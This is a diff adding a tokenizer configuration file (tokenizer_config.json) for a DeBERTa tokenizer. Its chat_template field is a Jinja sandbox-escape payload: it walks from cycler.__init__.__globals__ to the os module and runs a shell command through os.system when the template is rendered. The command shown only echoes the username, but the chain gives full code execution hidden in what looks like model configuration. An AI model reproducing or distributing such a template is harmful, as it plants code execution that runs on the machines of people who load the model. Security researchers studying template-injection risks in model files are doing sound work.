@@ -1,0 +1,5 @@
+{
+  "tokenizer_class": "DebertaTokenizer",
+  "chat_template": "{% set x = cycler.__init__.__globals__ %}{{ x.os.system('echo ' + x.__builtins__.__import__('os').environ.get('USER', 'unknown')) }}",
+  "model_max_length": 1024
+}
